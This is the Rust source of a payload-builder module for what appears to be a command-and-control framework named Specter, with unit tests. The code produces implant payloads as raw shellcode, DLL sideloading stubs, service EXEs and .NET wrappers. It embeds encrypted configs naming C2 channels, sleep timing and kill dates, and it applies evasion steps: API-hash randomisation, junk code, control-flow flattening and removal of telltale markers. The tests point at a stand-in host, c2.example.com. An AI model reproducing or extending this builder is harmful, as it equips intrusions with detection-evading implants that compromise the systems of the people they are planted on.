pub mod config_gen;
pub mod formats;
pub mod obfuscation;
pub mod yara;

pub use config_gen::{
    generate_config, generate_config_with_evasion, generate_config_with_magic, ChannelConfig,
    EvasionFlags, GeneratedConfig, SleepConfig, DEFAULT_CONFIG_MAGIC,
};
pub use formats::{
    format_dll, format_dotnet, format_hta_stager, format_ps1_stager, format_raw,
    format_service_exe, list_formats, FormatInfo,
};
pub use obfuscation::{
    apply_transforms, finalize_payload, obfuscate, obfuscate_blob, ObfuscationError,
    ObfuscationResult, ObfuscationSettings, RandomizedMagics,
};
pub use yara::{scan_payload, YaraError, YaraMatch};

use std::collections::HashMap;
use std::path::PathBuf;

use thiserror::Error;
use x25519_dalek::PublicKey;

use crate::profile::schema::Profile;

#[derive(Debug, Error)]
pub enum BuilderError {
    #[error("config error: {0}")]
    Config(String),
    #[error("template not found: {0}")]
    TemplateNotFound(String),
    #[error("toolchain error: {0}")]
    Toolchain(String),
    #[error("io error: {0}")]
    Io(#[from] std::io::Error),
}

/// Output format for generated payloads.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum OutputFormat {
    /// Raw PIC shellcode blob + config.
    RawShellcode,
    /// DLL sideloading payload.
    DllSideload,
    /// Windows service EXE.
    ServiceExe,
    /// .NET assembly wrapper.
    DotNetAssembly,
}

impl OutputFormat {
    pub fn as_str(&self) -> &'static str {
        match self {
            OutputFormat::RawShellcode => "raw",
            OutputFormat::DllSideload => "dll",
            OutputFormat::ServiceExe => "service_exe",
            OutputFormat::DotNetAssembly => "dotnet",
        }
    }

    pub fn extension(&self) -> &'static str {
        match self {
            OutputFormat::RawShellcode => "bin",
            OutputFormat::DllSideload => "dll",
            OutputFormat::ServiceExe => "exe",
            OutputFormat::DotNetAssembly => "exe",
        }
    }

    #[allow(clippy::should_implement_trait)]
    pub fn from_str(s: &str) -> Option<Self> {
        match s.to_lowercase().as_str() {
            "raw" | "shellcode" | "bin" => Some(OutputFormat::RawShellcode),
            "dll" | "sideload" => Some(OutputFormat::DllSideload),
            "service_exe" | "service" | "exe" => Some(OutputFormat::ServiceExe),
            "dotnet" | ".net" | "assembly" => Some(OutputFormat::DotNetAssembly),
            _ => None,
        }
    }
}

/// Pre-compiled template blob loaded at init.
#[derive(Debug, Clone)]
pub struct TemplateBlob {
    /// Raw bytes of the template (PIC blob, DLL stub, etc.).
    pub data: Vec<u8>,
    /// Descriptive name.
    pub name: String,
    /// Output format this template supports.
    pub format: OutputFormat,
}

/// Configuration for payload builder initialization.
#[derive(Debug, Clone)]
pub struct BuilderConfig {
    /// Directory containing pre-compiled template blobs.
    pub template_dir: PathBuf,
}

/// Result of a payload build.
#[derive(Debug, Clone)]
pub struct BuildResult {
    /// The final payload bytes.
    pub payload: Vec<u8>,
    /// Output format used.
    pub format: OutputFormat,
    /// Implant X25519 public key for this build.
    pub implant_pubkey: [u8; 32],
    /// Unique build ID.
    pub build_id: String,
}

/// Payload builder: loads pre-compiled template blobs and applies binary-level
/// transforms to produce unique implant payloads.
pub struct PayloadBuilder {
    /// Loaded template blobs keyed by output format.
    templates: HashMap<OutputFormat, TemplateBlob>,
    /// Path to template directory.
    template_dir: PathBuf,
    /// Entry point offset into the PIC blob (from specter.map).
    /// The stub jumps to pic_base + entry_offset.
    pic_entry_offset: u32,
}

impl PayloadBuilder {
    /// Initialize the payload builder with the given config.
    ///
    /// Verifies the template directory exists and loads any available templates.
    pub fn new(config: &BuilderConfig) -> Result<Self, BuilderError> {
        let mut builder = Self {
            templates: HashMap::new(),
            template_dir: config.template_dir.clone(),
            pic_entry_offset: 0,
        };
        builder.load_templates()?;
        Ok(builder)
    }

    /// Verify toolchain availability and load template blobs from disk.
    fn load_templates(&mut self) -> Result<(), BuilderError> {
        if !self.template_dir.exists() {
            // Template dir is optional — builder can work without pre-compiled templates
            // by generating raw shellcode from config only.
            tracing::warn!(
                "Template directory does not exist: {}",
                self.template_dir.display()
            );
            return Ok(());
        }

        // Load known template files
        let template_files: &[(&str, OutputFormat)] = &[
            ("specter.bin", OutputFormat::RawShellcode),
            ("sideload_stub.dll", OutputFormat::DllSideload),
            ("service_stub.exe", OutputFormat::ServiceExe),
            ("dotnet_stub.exe", OutputFormat::DotNetAssembly),
        ];

        for (filename, format) in template_files {
            let path = self.template_dir.join(filename);
            if path.exists() {
                let data = std::fs::read(&path)?;
                tracing::info!("Loaded template '{}' ({} bytes)", filename, data.len());
                self.templates.insert(
                    *format,
                    TemplateBlob {
                        data,
                        name: filename.to_string(),
                        format: *format,
                    },
                );
            }
        }

        // PIC blob entry is always at offset 0.
        // The linker script places .text$A (implant_entry) first in .text,
        // and objcopy -O binary -j .text extracts from the start of .text.
        // The VMA in specter.map (e.g. 0x1020) is the PE virtual address,
        // NOT the blob offset.
        self.pic_entry_offset = 0;

        Ok(())
    }

    /// Check if a particular output format is available (has a loaded template).
    pub fn has_format(&self, format: OutputFormat) -> bool {
        self.templates.contains_key(&format)
    }

    /// List available output formats.
    pub fn available_formats(&self) -> Vec<OutputFormat> {
        self.templates.keys().copied().collect()
    }

    /// Build a payload in the specified output format.
    ///
    /// 1. Generate implant config blob (X25519 keypair, profile, channels, etc.)
    /// 2. Retrieve the template blob for the requested format
    /// 3. Embed the config blob into the template using binary patching
    /// 4. Return the final payload
    pub fn build(
        &self,
        format: OutputFormat,
        profile: &Profile,
        server_pubkey: &PublicKey,
        channels: &[ChannelConfig],
        sleep_config: &SleepConfig,
        kill_date: Option<i64>,
    ) -> Result<BuildResult, BuilderError> {
        self.build_with_evasion(
            format,
            profile,
            server_pubkey,
            channels,
            sleep_config,
            kill_date,
            EvasionFlags::default(),
            false,
            false,
            &ObfuscationSettings::default(),
        )
    }

    pub fn build_with_evasion(
        &self,
        format: OutputFormat,
        profile: &Profile,
        server_pubkey: &PublicKey,
        channels: &[ChannelConfig],
        sleep_config: &SleepConfig,
        kill_date: Option<i64>,
        evasion: EvasionFlags,
        _debug_mode: bool,
        _skip_anti_analysis: bool,
        obfuscation_settings: &ObfuscationSettings,
    ) -> Result<BuildResult, BuilderError> {
        // Get the PIC blob for key derivation (implant derives key from SHA256 of first 64 bytes)
        let pic_blob = self
            .templates
            .get(&OutputFormat::RawShellcode)
            .map(|t| t.data.as_slice())
            .unwrap_or(&[]);

        // Phase 0.4: Derive config magic from CRC32 of the first 64 bytes
        // of the PIC blob. The implant computes the same CRC32 at runtime,
        // eliminating the need for the SPECCFGM patchable marker.
        let config_magic = crc32_config_magic(&pic_blob[..64.min(pic_blob.len())]);

        // Generate config with the derived magic so the AEAD AAD matches
        // what the implant will compute from CRC32(pic_base[0..64]).
        let gen = generate_config_with_magic(
            profile,
            server_pubkey,
            channels,
            sleep_config,
            kill_date,
            evasion,
            pic_blob,
            config_magic,
        )?;

        let build_id = uuid::Uuid::new_v4().to_string();

        // Phase A: Apply obfuscation transforms to the PIC blob BEFORE embedding.
        // This rotates string keys, randomizes API hashes, inserts junk code,
        // and applies CFF on the raw PIC blob where the SPEC* markers are.
        let obfuscated_pic: Option<Vec<u8>> = if let Some(pic_template) =
            self.templates.get(&OutputFormat::RawShellcode)
        {
            let mut pic_data = pic_template.data.clone();
            obfuscation::apply_transforms(&mut pic_data, obfuscation_settings)
                .map_err(|e| BuilderError::Config(format!("Obfuscation transform failed: {e}")))?;
            Some(pic_data)
        } else {
            None
        };

        // For raw shellcode, concatenate PIC blob + config.
        // For PE formats, try pre-compiled template first, fall back to
        // generated minimal PE stubs if no template is available.
        let payload = if format == OutputFormat::RawShellcode {
            self.format_raw_with_pic(&gen, obfuscated_pic.as_deref())?
        } else if let Some(template) = self.templates.get(&format) {
            // Pre-compiled PE stub: patch config, then embed PIC blob
            let mut patched = self.embed_config(template, &gen)?;

            // Embed the (obfuscated) PIC blob into the stub at the SPECPICBLOB marker
            if let Some(ref pic_data) = obfuscated_pic {
                patched = Self::embed_pic_blob(patched, pic_data, self.pic_entry_offset)?;
            }

            patched
        } else {
            // No pre-compiled template — use generated PE stubs.
            // Use the obfuscated PIC blob if available, otherwise empty.
            let pic_blob = obfuscated_pic.as_deref().unwrap_or(&[]);
            match format {
                OutputFormat::DllSideload => {
                    formats::format_dll(pic_blob, &gen.config_blob, None)
                }
                OutputFormat::ServiceExe => {
                    formats::format_service_exe(pic_blob, &gen.config_blob, "SpecterSvc")
                }
                OutputFormat::DotNetAssembly => {
                    formats::format_dotnet(pic_blob, &gen.config_blob)
                }
                OutputFormat::RawShellcode => unreachable!(),
            }
        };

        let mut payload = payload;

        // Phase 0.4: SPECCFGM marker patching removed — config magic is now
        // derived from CRC32(pic_blob[0..64]) on both sides.

        // Phase 0.4: SPBF marker patching removed — build flags are now
        // controlled by compile-time SPECTER_DEV_BUILD and config TLV 0x8A.

        // Phase B: Scrub all remaining SPEC* markers from the final payload.
        // This must happen AFTER config magic patching (SPECCFGM) and build
        // flags patching (SPBF) are complete, but BEFORE XOR encryption.
        obfuscation::finalize_payload(&mut payload);

        Ok(BuildResult {
            payload,
            format,
            implant_pubkey: gen.implant_pubkey,
            build_id,
        })
    }

    /// Format raw shellcode using the provided (potentially obfuscated) PIC blob.
    ///
    /// Layout: [PIC blob][config_len: u32 LE][config_blob]
    fn format_raw_with_pic(
        &self,
        gen: &GeneratedConfig,
        pic_data: Option<&[u8]>,
    ) -> Result<Vec<u8>, BuilderError> {
        let mut payload = Vec::new();

        // Prepend PIC blob if available
        if let Some(pic) = pic_data {
            payload.extend_from_slice(pic);
        }

        // Append config: [length: u32 LE][encrypted config blob]
        let config_len = gen.config_blob.len() as u32;
        payload.extend_from_slice(&config_len.to_le_bytes());
        payload.extend_from_slice(&gen.config_blob);

        Ok(payload)
    }

    /// Embed config into a template blob by locating the config placeholder marker
    /// and patching it with the actual config data.
    ///
    /// Marker: 16 bytes of 0x43 ("CCCCCCCCCCCCCCCC") followed by 4-byte LE max size.
    /// The builder replaces this region with: [config_len: u32 LE][config_blob][zero-pad].
    fn embed_config(
        &self,
        template: &TemplateBlob,
        gen: &GeneratedConfig,
    ) -> Result<Vec<u8>, BuilderError> {
        const MARKER: &[u8; 16] = b"CCCCCCCCCCCCCCCC";

        let mut payload = template.data.clone();

        // Find the config placeholder marker
        if let Some(marker_pos) = find_marker(&payload, MARKER) {
            // Read the max config size from the 4 bytes after the marker
            let size_offset = marker_pos + 16;
            if size_offset + 4 > payload.len() {
                return Err(BuilderError::Config(
                    "config marker found but size field truncated".into(),
                ));
            }
            let max_size = u32::from_le_bytes([
                payload[size_offset],
                payload[size_offset + 1],
                payload[size_offset + 2],
                payload[size_offset + 3],
            ]) as usize;

            let config_with_len = {
                let mut buf = Vec::with_capacity(4 + gen.config_blob.len());
                buf.extend_from_slice(&(gen.config_blob.len() as u32).to_le_bytes());
                buf.extend_from_slice(&gen.config_blob);
                buf
            };

            if config_with_len.len() > max_size {
                return Err(BuilderError::Config(format!(
                    "config blob ({} bytes) exceeds template capacity ({} bytes)",
                    config_with_len.len(),
                    max_size
                )));
            }

            // Preserve the marker (16 bytes) and max_size field (4 bytes) so the
            // stub can find them at runtime. Write config data into the reserved
            // area starting at marker_pos + 20.
            let data_start = marker_pos + 20; // after marker(16) + max_size(4)
            let data_end = data_start + max_size;
            let data_end = data_end.min(payload.len());

            // Write [config_len: u32][config_blob] into the data region.
            // Only zero/write the bytes we actually need — do NOT zero the
            // entire max_size region, as subsequent data (e.g., PIC blob marker)
            // may immediately follow the config capacity boundary.
            let write_end = (data_start + config_with_len.len()).min(data_end);
            payload[data_start..write_end]
                .copy_from_slice(&config_with_len[..write_end - data_start]);
        } else {
            // No marker found — append config to the end (fallback)
            let config_len = gen.config_blob.len() as u32;
            payload.extend_from_slice(&config_len.to_le_bytes());
            payload.extend_from_slice(&gen.config_blob);
        }

        Ok(payload)
    }

    /// Embed a PIC blob into a PE template by locating the PIC placeholder marker
    /// and patching it with the actual PIC blob data + entry offset.
    ///
    /// Marker layout in stub: `[SPECPICBLOB\x00 (12)][pic_size: u32][entry_offset: u32][pic_data...]`
    /// The builder writes pic_size, entry_offset, and copies pic_data.
    ///
    /// The stubs allocate a large `.data` region after the marker
    /// (PIC_MAX_CAPACITY = 512KB) which the builder fills with PIC data.
    fn embed_pic_blob(
        mut payload: Vec<u8>,
        pic_blob: &[u8],
        entry_offset: u32,
    ) -> Result<Vec<u8>, BuilderError> {
        const PIC_MARKER: &[u8; 12] = b"SPECPICBLOB\x00";
        const PIC_MAX_CAPACITY: usize = 512 * 1024;

        if pic_blob.is_empty() {
            return Ok(payload);
        }

        if let Some(marker_pos) = find_marker(&payload, PIC_MARKER) {
            let size_offset = marker_pos + PIC_MARKER.len();

            // Verify there is room for size + entry_offset fields
            if size_offset + 8 > payload.len() {
                return Err(BuilderError::Config(
                    "PIC blob marker found but header fields truncated".into(),
                ));
            }

            if pic_blob.len() > PIC_MAX_CAPACITY {
                return Err(BuilderError::Config(format!(
                    "PIC blob ({} bytes) exceeds max capacity ({} bytes)",
                    pic_blob.len(),
                    PIC_MAX_CAPACITY,
                )));
            }

            // Data region starts after marker(12) + pic_size(4) + entry_offset(4)
            let data_offset = size_offset + 8;
            let available = payload.len().saturating_sub(data_offset);

            // Write PIC blob size (u32 LE)
            payload[size_offset..size_offset + 4]
                .copy_from_slice(&(pic_blob.len() as u32).to_le_bytes());

            // Write entry offset (u32 LE)
            payload[size_offset + 4..size_offset + 8]
                .copy_from_slice(&entry_offset.to_le_bytes());

            if pic_blob.len() > available {
                // PE file's data section was truncated (zero-init optimization).
                // Extend the payload to make room.
                let needed = data_offset + pic_blob.len();
                payload.resize(needed, 0);
                tracing::info!(
                    "Extended PE from {} to {} bytes to fit PIC blob ({} bytes)",
                    available + data_offset, needed, pic_blob.len()
                );
            }

            // Copy PIC blob data
            payload[data_offset..data_offset + pic_blob.len()]
                .copy_from_slice(pic_blob);
        } else {
            // No marker found in template -- this is an older-style stub
            // that does not support PIC embedding. Log a warning but
            // do not fail; the builder may have other embedding strategies.
            tracing::warn!(
                "PIC blob marker (SPECPICBLOB) not found in template; \
                 PIC blob will not be embedded"
            );
        }

        Ok(payload)
    }
}

/// Initialize the payload builder (convenience wrapper).
pub fn builder_init(config: &BuilderConfig) -> Result<PayloadBuilder, BuilderError> {
    PayloadBuilder::new(config)
}

/// Derive config magic from CRC32 of the PIC blob header (first 64 bytes).
///
/// Uses IEEE 802.3 CRC32 (polynomial 0xEDB88320, init 0xFFFFFFFF, final XOR
/// 0xFFFFFFFF). This is the same algorithm as `evasion_compute_crc()` in the
/// implant (`implant/core/src/evasion/hooks.c`).
fn crc32_config_magic(data: &[u8]) -> u32 {
    let mut crc: u32 = 0xFFFFFFFF;
    for &byte in data {
        crc ^= byte as u32;
        for _ in 0..8 {
            if crc & 1 != 0 {
                crc = (crc >> 1) ^ 0xEDB88320;
            } else {
                crc >>= 1;
            }
        }
    }
    crc ^ 0xFFFFFFFF
}

/// Find a byte marker in a blob.
fn find_marker(data: &[u8], marker: &[u8]) -> Option<usize> {
    data.windows(marker.len())
        .position(|window| window == marker)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::profile::parse_profile;
    use std::io::Write;
    use tempfile::TempDir;

    fn test_profile() -> Profile {
        parse_profile(
            r#"
name: builder-test
description: test
tls:
  cipher_suites: ["TLS_AES_128_GCM_SHA256"]
http:
  request:
    method: POST
    uri_patterns: ["/api/checkin"]
  response:
    status_code: 200
timing:
  callback_interval: 30
transform:
  compress: lz4
  encrypt: chacha20-poly1305
  encode: base64
"#,
        )
        .unwrap()
    }

    fn test_channels() -> Vec<ChannelConfig> {
        vec![ChannelConfig {
            kind: "https".into(),
            address: "https://c2.example.com/api/checkin".into(),
        }]
    }

    #[test]
    fn test_builder_init_missing_dir() {
        let config = BuilderConfig {
            template_dir: PathBuf::from("/nonexistent/path"),
        };
        // Should succeed — missing template dir is a warning, not an error
        let builder = builder_init(&config).unwrap();
        assert!(builder.available_formats().is_empty());
    }

    #[test]
    fn test_builder_load_templates() {
        let dir = TempDir::new().unwrap();
        let mut f = std::fs::File::create(dir.path().join("specter.bin")).unwrap();
        f.write_all(&[0xCC; 64]).unwrap();

        let config = BuilderConfig {
            template_dir: dir.path().to_path_buf(),
        };
        let builder = builder_init(&config).unwrap();
        assert!(builder.has_format(OutputFormat::RawShellcode));
        assert!(!builder.has_format(OutputFormat::DllSideload));
    }

    #[test]
    fn test_builder_raw_build_no_template() {
        let config = BuilderConfig {
            template_dir: PathBuf::from("/nonexistent"),
        };
        let builder = builder_init(&config).unwrap();

        let secret = x25519_dalek::StaticSecret::random_from_rng(rand::thread_rng());
        let pubkey = PublicKey::from(&secret);

        let result = builder
            .build(
                OutputFormat::RawShellcode,
                &test_profile(),
                &pubkey,
                &test_channels(),
                &SleepConfig::default(),
                None,
            )
            .unwrap();

        // Should produce: [config_len: 4][config_blob]
        assert!(result.payload.len() > 4);
        let config_len = u32::from_le_bytes([
            result.payload[0],
            result.payload[1],
            result.payload[2],
            result.payload[3],
        ]) as usize;
        assert_eq!(result.payload.len(), 4 + config_len);
    }

    #[test]
    fn test_builder_raw_build_with_template() {
        let dir = TempDir::new().unwrap();
        let template_data = vec![0x90; 128]; // NOP sled as fake PIC blob
        std::fs::write(dir.path().join("specter.bin"), &template_data).unwrap();

        let config = BuilderConfig {
            template_dir: dir.path().to_path_buf(),
        };
        let builder = builder_init(&config).unwrap();

        let secret = x25519_dalek::StaticSecret::random_from_rng(rand::thread_rng());
        let pubkey = PublicKey::from(&secret);

        let result = builder
            .build(
                OutputFormat::RawShellcode,
                &test_profile(),
                &pubkey,
                &test_channels(),
                &SleepConfig::default(),
                None,
            )
            .unwrap();

        // Payload starts with the template
        assert_eq!(&result.payload[..128], &template_data[..]);
        // Then config_len + config
        let config_len = u32::from_le_bytes([
            result.payload[128],
            result.payload[129],
            result.payload[130],
            result.payload[131],
        ]) as usize;
        assert_eq!(result.payload.len(), 128 + 4 + config_len);
    }

    #[test]
    fn test_builder_embed_config_with_marker() {
        let dir = TempDir::new().unwrap();

        // Create a DLL stub with a config marker and enough room for config blob
        let mut stub = vec![0x00u8; 2048];
        // Place marker at offset 64
        stub[64..80].copy_from_slice(b"CCCCCCCCCCCCCCCC");
        // Max config size = 1024 bytes (after the 16-byte marker + 4-byte size)
        stub[80..84].copy_from_slice(&1024u32.to_le_bytes());

        std::fs::write(dir.path().join("sideload_stub.dll"), &stub).unwrap();

        let config = BuilderConfig {
            template_dir: dir.path().to_path_buf(),
        };
        let builder = builder_init(&config).unwrap();
        assert!(builder.has_format(OutputFormat::DllSideload));

        let secret = x25519_dalek::StaticSecret::random_from_rng(rand::thread_rng());
        let pubkey = PublicKey::from(&secret);

        let result = builder
            .build(
                OutputFormat::DllSideload,
                &test_profile(),
                &pubkey,
                &test_channels(),
                &SleepConfig::default(),
                None,
            )
            .unwrap();

        // The marker region should be patched (no more "CCCC..." at offset 64)
        // Marker is preserved so the stub can find it at runtime
        assert_eq!(&result.payload[64..80], b"CCCCCCCCCCCCCCCC");
        // Payload size should be same as stub (in-place patching)
        assert_eq!(result.payload.len(), stub.len());
    }

    #[test]
    fn test_builder_missing_template_format() {
        let config = BuilderConfig {
            template_dir: PathBuf::from("/nonexistent"),
        };
        let builder = builder_init(&config).unwrap();

        let secret = x25519_dalek::StaticSecret::random_from_rng(rand::thread_rng());
        let pubkey = PublicKey::from(&secret);

        let result = builder.build(
            OutputFormat::DllSideload,
            &test_profile(),
            &pubkey,
            &test_channels(),
            &SleepConfig::default(),
            None,
        );
        // Falls back to generated PE stubs when no template exists
        assert!(result.is_ok());
    }

    #[test]
    fn test_output_format_roundtrip() {
        for fmt in &[
            OutputFormat::RawShellcode,
            OutputFormat::DllSideload,
            OutputFormat::ServiceExe,
            OutputFormat::DotNetAssembly,
        ] {
            let s = fmt.as_str();
            let parsed = OutputFormat::from_str(s).expect(&format!("should parse '{s}'"));
            assert_eq!(*fmt, parsed);
        }
    }

    #[test]
    fn test_find_marker() {
        let data = b"\x00\x00\x00CCCCCCCCCCCCCCCC\x80\x00\x00\x00";
        let pos = find_marker(data, b"CCCCCCCCCCCCCCCC");
        assert_eq!(pos, Some(3));
    }

    #[test]
    fn test_embed_pic_blob_with_marker() {
        // Create a payload with a PIC marker + size + entry_offset + space
        let mut template = vec![0x00u8; 4096];
        // Place PIC marker at offset 100
        template[100..112].copy_from_slice(b"SPECPICBLOB\x00");
        // Size field (4 bytes, initially 0) at 112
        template[112..116].copy_from_slice(&0u32.to_le_bytes());
        // Entry offset field (4 bytes, initially 0) at 116
        template[116..120].copy_from_slice(&0u32.to_le_bytes());
        // PIC data space starts at 120

        let pic_blob = vec![0xCC; 256];
        let result = PayloadBuilder::embed_pic_blob(template.clone(), &pic_blob, 0).unwrap();

        // Size field should now contain 256
        let embedded_size = u32::from_le_bytes([
            result[112], result[113], result[114], result[115],
        ]);
        assert_eq!(embedded_size, 256);

        // Entry offset should be 0 (blob offset, not PE VMA)
        let embedded_entry = u32::from_le_bytes([
            result[116], result[117], result[118], result[119],
        ]);
        assert_eq!(embedded_entry, 0);

        // PIC data should be at offset 120
        assert_eq!(&result[120..120 + 256], &pic_blob[..]);

        // Overall size unchanged (in-place patching)
        assert_eq!(result.len(), 4096);
    }

    #[test]
    fn test_embed_pic_blob_extends_pe_when_data_truncated() {
        // Simulate real scenario: stub PE is 270KB but PIC blob is 254KB.
        // The marker is near end of file, so there's not enough in-file space.
        // embed_pic_blob should extend the payload.
        let mut template = vec![0x00u8; 1024]; // Small PE (simulates truncated .data)
        // Place PIC marker near the end (offset 900)
        template[900..912].copy_from_slice(b"SPECPICBLOB\x00");
        template[912..916].copy_from_slice(&0u32.to_le_bytes());
        template[916..920].copy_from_slice(&0u32.to_le_bytes());
        // Available after header: 1024 - 920 = 104 bytes (much less than PIC blob)

        let pic_blob = vec![0xCC; 8192]; // 8KB PIC blob
        let result = PayloadBuilder::embed_pic_blob(template, &pic_blob, 0).unwrap();

        // File should have been extended
        assert!(result.len() >= 920 + 8192, "PE should be extended to fit PIC blob, got {}", result.len());

        // PIC size should be written
        let pic_size = u32::from_le_bytes([result[912], result[913], result[914], result[915]]);
        assert_eq!(pic_size, 8192);

        // Entry offset should be 0
        let entry_off = u32::from_le_bytes([result[916], result[917], result[918], result[919]]);
        assert_eq!(entry_off, 0);

        // PIC data should be at offset 920
        assert_eq!(&result[920..920 + 8192], &pic_blob[..]);
    }

    #[test]
    fn test_embed_pic_blob_empty_blob() {
        let template = vec![0x00u8; 512];
        let result = PayloadBuilder::embed_pic_blob(template.clone(), &[], 0).unwrap();
        // No changes when blob is empty
        assert_eq!(result, template);
    }

    #[test]
    fn test_embed_pic_blob_no_marker() {
        // Template without PIC marker -- should succeed with warning
        let template = vec![0x00u8; 512];
        let pic_blob = vec![0xCC; 64];
        let result = PayloadBuilder::embed_pic_blob(template.clone(), &pic_blob, 0).unwrap();
        // Payload unchanged (no marker to patch)
        assert_eq!(result, template);
    }

    #[test]
    fn test_builder_dll_with_config_and_pic() {
        let dir = TempDir::new().unwrap();

        // Create a raw PIC template (specter.bin)
        let pic_data = vec![0x90; 128]; // NOP sled as fake PIC blob
        std::fs::write(dir.path().join("specter.bin"), &pic_data).unwrap();

        // Create a DLL stub with both config marker and PIC marker
        let mut stub = vec![0x00u8; 8192];

        // Config marker at offset 64
        stub[64..80].copy_from_slice(b"CCCCCCCCCCCCCCCC");
        stub[80..84].copy_from_slice(&1024u32.to_le_bytes());

        // PIC marker at offset 2048: [marker:12][size:4][entry_off:4][data...]
        stub[2048..2060].copy_from_slice(b"SPECPICBLOB\x00");
        stub[2060..2064].copy_from_slice(&0u32.to_le_bytes()); // size
        stub[2064..2068].copy_from_slice(&0u32.to_le_bytes()); // entry_offset

        std::fs::write(dir.path().join("sideload_stub.dll"), &stub).unwrap();

        let config = BuilderConfig {
            template_dir: dir.path().to_path_buf(),
        };
        let builder = builder_init(&config).unwrap();
        assert!(builder.has_format(OutputFormat::DllSideload));
        assert!(builder.has_format(OutputFormat::RawShellcode));

        let secret = x25519_dalek::StaticSecret::random_from_rng(rand::thread_rng());
        let pubkey = PublicKey::from(&secret);

        let result = builder
            .build(
                OutputFormat::DllSideload,
                &test_profile(),
                &pubkey,
                &test_channels(),
                &SleepConfig::default(),
                None,
            )
            .unwrap();

        // Config marker should be patched
        // Marker is preserved so the stub can find it at runtime
        assert_eq!(&result.payload[64..80], b"CCCCCCCCCCCCCCCC");

        // PIC blob size should be written at offset 2060
        let pic_size = u32::from_le_bytes([
            result.payload[2060],
            result.payload[2061],
            result.payload[2062],
            result.payload[2063],
        ]);
        assert_eq!(pic_size, 128);

        // Entry offset at 2064 (0 since no map file in test)
        let entry_off = u32::from_le_bytes([
            result.payload[2064],
            result.payload[2065],
            result.payload[2066],
            result.payload[2067],
        ]);
        assert_eq!(entry_off, 0);

        // PIC blob data should be at offset 2068
        assert_eq!(&result.payload[2068..2068 + 128], &pic_data[..]);

        // Payload size unchanged
        assert_eq!(result.payload.len(), stub.len());
    }

    #[test]
    fn test_builds_are_unique() {
        let config = BuilderConfig {
            template_dir: PathBuf::from("/nonexistent"),
        };
        let builder = builder_init(&config).unwrap();

        let secret = x25519_dalek::StaticSecret::random_from_rng(rand::thread_rng());
        let pubkey = PublicKey::from(&secret);

        let r1 = builder
            .build(
                OutputFormat::RawShellcode,
                &test_profile(),
                &pubkey,
                &test_channels(),
                &SleepConfig::default(),
                None,
            )
            .unwrap();
        let r2 = builder
            .build(
                OutputFormat::RawShellcode,
                &test_profile(),
                &pubkey,
                &test_channels(),
                &SleepConfig::default(),
                None,
            )
            .unwrap();

        // Each build should produce a unique payload (different keypair + nonce)
        assert_ne!(r1.payload, r2.payload);
        assert_ne!(r1.implant_pubkey, r2.implant_pubkey);
        assert_ne!(r1.build_id, r2.build_id);
    }
}
